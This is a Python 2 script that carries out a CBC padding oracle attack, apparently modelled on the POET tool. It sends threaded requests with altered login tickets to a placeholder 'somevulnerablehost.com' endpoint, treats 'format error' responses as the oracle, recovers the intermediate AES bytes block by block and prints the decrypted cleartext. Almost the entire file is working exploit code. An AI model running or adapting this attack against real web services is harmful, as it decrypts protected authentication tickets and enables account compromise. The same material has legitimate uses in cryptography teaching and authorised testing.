__author__ = 'jaideeep'

import urllib
import urllib2
#import Queue
#import threading
import sendRequeststhread

tempRes = []

'''
class ThreadUrl(threading.Thread):
    """Threaded Url Grab"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            #grabs host from queue
            host,num = self.queue.get()
            try:
                ufile = urllib.urlopen(host)
                text = ufile.read()
                if 'format error' in text:
                    print 'Found in: '+host
                    tempRes.append(num)
                    print str(tempRes)
                self.queue.task_done()
            except:
                self.queue.task_done()
                continue

'''


def wget(url,num):
    ufile = urllib.urlopen(url)
    info = ufile.info()
    if info.gettype() == 'text/html':
        text = ufile.read()  ## read all its text
        if 'format error' in text:
            print 'Found in: '+url
            tempRes.append(num)
            print str(tempRes)

def fuzz(tmp, pt):
    res = -1
    host = []
    num=''
    pool = sendRequeststhread.ThreadPool(20)
    for n in range(256):
        if n<16:
            l = tmp[0:pt+1]+hex(n)[2:]+tmp[pt+2:]
            url = 'https://somevulnerablehost.com/controller?action=ticketlogin&ticket='+l+'&login=Login'
        else:
            l = tmp[0:pt]+hex(n)[2:]+tmp[pt+2:]
            url = 'https://somevulnerablehost.com/controller?action=ticketlogin&ticket='+l+'&login=Login'
        num = hex(n)[2:]
        pool.add_task(wget, url, num)
    pool.wait_completion()
    print 'Tests Completed !'

class PoetDecryptor:
    newIV = '00000000000000000000000000000000'
    interimRes = []
    initPad = 0x01
    #cipherBlock = 'C2E902E6E682D692188BDF64C068CF69'
    #prevBlock = 'A0F89D45ED71E4B3E77C1B58F9417B91'
    cipherBlock = 'C5B94230B64608E7ABB09A976CD6DC8C'
    prevBlock = 'C2E902E6E682D692188BDF64C068CF69'

    def updateIV(self,ind):
        str = ''
        self.interimRes.reverse()
        for n in self.interimRes[:]:
            num = int(n,16)
            tmp = hex(num^self.initPad)[2:]
            t2 = tmp
            if len(t2) == 1:
                t2 = '0'+tmp
            str += t2
            #print hex(num^self.initPad)
        self.interimRes.reverse()
        self.newIV = '0'*ind+str
        print "New IV: "+self.newIV
        print "\n=======\n"+str

    def updateRes(self,n):
        self.interimRes.append(hex(n^self.initPad))
        print 'New Intermediate Result: '+str(self.interimRes)
        self.initPad+=1


    def getData(self):
        for i in range(15,-1,-1):
            #global newIV
            fuzz(self.newIV+self.cipherBlock,2*i)
            print 'aaaa: '+str(tempRes)
            n = int(tempRes.pop(),16)
            self.updateRes(n)
            self.updateIV(2*i)

    def getClearText(self):
        l2 = [self.prevBlock[n*2:n*2+2] for n in range(len(self.prevBlock)/2)]
        self.interimRes.reverse()
        for i in range(len(self.interimRes)):
            print chr(int(self.interimRes[i],16)^int(l2[i],16))
        pass


p = PoetDecryptor()
p.getData()
p.getClearText()
